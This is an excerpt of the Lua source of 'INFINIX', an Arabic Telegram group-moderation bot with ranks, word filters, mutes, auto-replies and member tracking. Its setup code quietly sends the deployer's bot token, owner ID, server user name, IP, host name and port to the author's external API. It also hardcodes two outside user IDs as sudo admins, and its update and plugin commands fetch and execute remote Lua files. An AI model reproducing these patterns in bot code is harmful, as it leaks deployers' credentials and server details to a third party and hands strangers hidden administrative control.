...
os.execute('lua INFINIX.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\naٴꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹٴ\n\27[0;33;49m')
local SUDOID = io.read():gsub(' ','') 
if tostring(SUDOID):match('%d+') then
data,res = https.request("https://api-INFINIX.tk/api-VB6BB/INFINIX.php?bn=INFINIX&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-INFINIX.tk/api-VB6BB/INFINIX.php?n=INFINIX&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
io.write('\27[0;31mꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua INFINIX.lua')
end 
end
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./INFINIX.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("DRG", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S INFINIX -X kill
screen -S INFINIX ./INFINIX
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SRC-INFINIX/Files_INFINIX/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1759431585,2109267580}   
...
local hash = database:sismember(bot_id.."VB6BB:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
...
var = true  
elseif database:sismember(bot_id..'VB6BB:MN:TF'..chat_id, user_id) then
var = true 
...
local UserName = (data.username_ or "x_pxxp")
...
local INFINIX_Msg = ''  
if msgs < 100 then 
INFINIX_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
INFINIX_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
INFINIX_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
INFINIX_Msg = 'متفاعل' 
elseif msgs < 1200 then 
INFINIX_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
INFINIX_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
INFINIX_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
INFINIX_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
INFINIX_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
INFINIX_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
INFINIX_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
INFINIX_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
INFINIX_Msg = 'رب التفاعل'  
end 
return INFINIX_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙸𝙽𝙵𝙸𝙽𝙸𝚇.")  
...
function plugin_INFINIX(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.INFINIX and msg then
pre_msg = plugin.INFINIX(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceINFINIX(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,INFINIX_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf INFINIX.lua')
os.execute('wget https://raw.githubusercontent.com/SRC-INFINIX/INFINIX/main/INFINIX.lua')
send(msg.chat_id_, msg.id_,' ⌯︙ تم تحديث السورس \n ⌯︙ لديك اخر اصدار لسورس انفنكس\n ⌯︙ الاصدار » { v 1.6 }')
dofile('INFINIX.lua')  
end
if text == 'الاصدار ⌯' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ⌯︙ اصدار سورس انفنكس \n ⌯︙ الاصدار »{ v 1.6 }')
end
...
-------------
if text == "🐉 حصريات و تحديثات انفنكس 🐉" and DevSoFi(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس انفنكس*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '📂┇𝙸𝙽𝙵𝙸𝙽𝙸𝚇 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/SAD1G"}},
}
...
send(msg.chat_id_, msg.id_,'⌯︙  عدد الكروبات الان » { '..#group..' }'..INFINIXk..''..INFINIX..'\n⌯︙  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ⌯︙ العضو » ['..result.title_..'](t.me/'..(username or 'x_pxxp')..')'
status  = '\n ⌯︙ تم ترقيته مطور'
...
usertext = '\n ⌯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'x_pxxp')..')'
status  = '\n ⌯︙ تم ترقيته مطور'
...
local INFINIX1_Msg = database:get(bot_id.."INFINIX1:Add:Filter:Rp2"..text..msg.chat_id_)   
if INFINIX1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⌯︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'x_pxxp')..') \n ⌯︙ '..INFINIX1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if INFINIX_Msg and not Special(msg) then  
local INFINIX_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if INFINIX_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⌯︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⌯︙ ["..INFINIX_Msg.."] \n")
else
send(msg.chat_id_,0," ⌯︙ العضو : {["..data.first_name_.."](T.ME/x_pxxp)}\n ⌯︙ ["..INFINIX_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ⌯︙ عذرا » {["..data.first_name_.."](T.ME/x_pxxp)}\n ⌯︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."INFINIX:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."INFINIX:blocname"..msg.chat_id_)
...
function VB6BB_name(t1,t2)
if t2.id_ then 
name_MRSOFI = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."INFINIX:blocname"..msg.chat_id_) or ""
...
bnnaGet(msg.sender_user_id_, VB6BB_name)
end
...
database:set(bot_id.."INFINIX:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."INFINIX:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."INFINIX:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."INFINIX:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."INFINIX:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."INFINIX:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."INFINIX:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."INFINIX:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."INFINIX:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."INFINIX:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "⌯︙ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "x_pxxp")..")\n⌯︙ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."INFINIX:teh"..msg.chat_id_).."} بجانب اسمك\n⌯︙ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local INFINIXChengName = database:get(bot_id.."INFINIX:Cheng:Name"..data.id_)
if not data.first_name_ then 
if INFINIXChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..INFINIXChengName..']')
database:del(bot_id.."INFINIX:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if INFINIXChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."INFINIX:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local INFINIXChengUserName = database:get(bot_id.."INFINIX:Cheng:UserName"..data.id_)
if not data.username_ then 
if INFINIXChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..INFINIXChengUserName..']')
database:del(bot_id.."INFINIX:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if INFINIXChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."INFINIX:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local INFINIXChengPhoto = database:get(bot_id.."INFINIX:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if INFINIXChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."INFINIX:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if INFINIXChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."INFINIX:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
⌯ ⦑ SOURCE INFINIX ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌯︙ [Source Channel](t.me/x_pxxp)
⌯︙ [Source Update ](t.me/SAD1G)     
⌯︙ [Source developer](t.me/VB6BB)     
⌯︙ [INFINIX programmer](t.me/GD_400) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS INFINIX](t.me/ghj2bot)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ⌯︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'x_pxxp')..') \n ⌯︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⌯︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'x_pxxp')..') \n ⌯︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."VB6BB:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'VB6BB:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SRC-INFINIX/Files_INFINIX/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ⌯︙ اهلا بك في متجر ملفات انفنكس\n ⌯︙ ملفات السورس ↓\nٴꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹٴ\n\n"
local TextE = "\nٴꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹٴ\n ⌯︙ علامة تعني { ✔️ } ملف مفعل\n ⌯︙ علامة تعني { ✖ } ملف معطل\n ⌯︙ قناة سورس انفنكس ↓\n".." ⌯︙ [اضغط هنا لدخول](t.me/x_pxxp) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/SRC-INFINIX/Files_INFINIX/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('INFINIX.lua')  
else
send(msg.chat_id_, msg.id_," ⌯︙ عذرا الملف لايدعم سورس انفنكس \n") 
end
return false
end
...
local UserName = (b.username_ or "SRC-INFINIX")
...
function Function_INFINIX(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_INFINIX, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_INFINIX, nil)
return false 
end
...
database:del(bot_id..'VB6BB:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⌯︙ تم مسح المنظفين')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'VB6BB:MN:TF'..msg.chat_id_)
t = "\n ⌯︙ قائمة المنظفين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'VB6BB:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⌯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'x_pxxp')..')'
status  = '\n ⌯︙ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
...
database:sadd(bot_id..'VB6BB:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ⌯︙ العضو » ['..result.title_..'](t.me/'..(username or 'x_pxxp')..')'
status  = '\n ⌯︙ تم ترقيته منظف'
texts = usertext..status
else
...
database:sadd(bot_id..'VB6BB:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⌯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'x_pxxp')..')'
status  = '\n ⌯︙ تم ترقيته منظف'
...
function start_function(extra, result, success)
database:srem(bot_id..'VB6BB:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⌯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'x_pxxp')..')'
...
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'VB6BB:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ⌯︙ العضو » ['..result.title_..'](t.me/'..(username or 'x_pxxp')..')'
status  = '\n ⌯︙ تم تنزيله من المنظفين'
texts = usertext..status
else
...
database:srem(bot_id..'VB6BB:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⌯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'x_pxxp')..')'
status  = '\n ⌯︙ تم تنزيله من المنظفين'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⌯︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'x_pxxp')..')'
status  = '\n ⌯︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ⌯︙ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⌯︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'x_pxxp')..')'
...
database:set(bot_id.."INFINIX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."INFINIX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ⌯︙ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."INFINIX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."INFINIX1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."INFINIX1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."INFINIX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ⌯︙ تم منع الكلمه مع التحذير")  
database:del(bot_id.."INFINIX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."INFINIX1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."INFINIX1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."INFINIX1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ⌯︙ ارسل الكلمه الان")  
database:set(bot_id.."INFINIX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."INFINIX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."INFINIX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."INFINIX1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."INFINIX1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."INFINIX1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."INFINIX1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."INFINIX1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."INFINIX1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ⌯︙ قائمة المنع \nٴꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹٴ\n"
for k,v in pairs(list) do  
local INFINIX_Msg = database:get(bot_id.."INFINIX1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..INFINIX_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ⌯︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'x_pxxp')..')'..'\n ⌯︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if not database:get(bot_id..'VB6BB:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
...
database:setex(bot_id..'VB6BB:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
...
database:sadd(bot_id.."VB6BB:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") and cleaner(msg) then  
local list = database:smembers(bot_id.."VB6BB:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "⌯︙ تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."VB6BB:allM"..msg.chat_id_)
end
end
if #list == 0 then
...
local num = database:smembers(bot_id.."VB6BB:allM"..msg.chat_id_)
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'انفنكس').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'انفنكس')
local INFINIX_Msg = {
'هههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههههه ك* اختك شتريد 😂.',
...
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
'تره شكيتني احجي كلمتك وولي 😂'..Namebot..'',
'عمري فداك '..Namebot..' كول حب'
}
send(msg.chat_id_, msg.id_,'['..INFINIX_Msg[math.random(#INFINIX_Msg)]..']') 
return false
end
...
if database:sismember(bot_id..'VB6BB:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
...
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'VB6BB:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:INFINIX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ⌯︙ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:INFINIX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:INFINIX:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:INFINIX:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:INFINIX:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"⌯︙ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:INFINIX:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:INFINIX:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:INFINIX:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:INFINIX:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:INFINIX:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:INFINIX:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:INFINIX:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:INFINIX:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:INFINIX:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:INFINIX:List:Rd:Sudo")
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙸𝙽𝙵𝙸𝙽𝙸𝚇.',url="t.me/x_pxxp"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."x_pxxp:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."x_pxxp:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."x_pxxp:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."x_pxxp:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"⌯︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."x_pxxp:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."x_pxxp:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس انفنكس يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:INFINIX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:INFINIX:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"⌯︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:INFINIX:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:INFINIX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:INFINIX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:INFINIX:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:INFINIX:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:INFINIX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:INFINIX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:INFINIX:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:INFINIX:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:INFINIX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:INFINIX:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:INFINIX:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:INFINIX:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:INFINIX:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:INFINIX:Add:Rd:Sudo:Text2"..text)   
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'انفنكس').." غادر" or text == 'بوت غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'x_pxxp')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
INFINIXdx(msg.chat_id_, msg.id_, ' ⌯︙ ايدي المجموعة » ( '..msg.chat_id_..' )\n ⌯︙ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ⌯︙ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ⌯︙ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
{
{text = '𝐈𝐍𝐅𝐈𝐍𝐈𝐗 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/x_pxxp"},
},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_, msg.id_, t..'ٴꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹٴٴ\n⌯︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙸𝙽𝙵𝙸𝙽𝙸𝚇. ](t.me/x_pxxp)➤ ')
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'انفنكس')
...
INFINIX = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(INFINIX)
...
--------------------------------------------------------------------------------------------------------------
SourceINFINIX(data.message_,data)
plugin_INFINIX(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local INFINIXAbot = database:get(bot_id.."INFINIX1:Add:Filter:Rp2"..text..result.chat_id_)   
if INFINIXAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⌯︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⌯︙ ["..INFINIXAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local INFINIX1_Msg = database:get(bot_id.."INFINIX1:Add:Filter:Rp2"..text..result.chat_id_)   
if INFINIX1_Msg then    
send(msg.chat_id_, msg.id_," ⌯︙ "..INFINIX1_Msg)
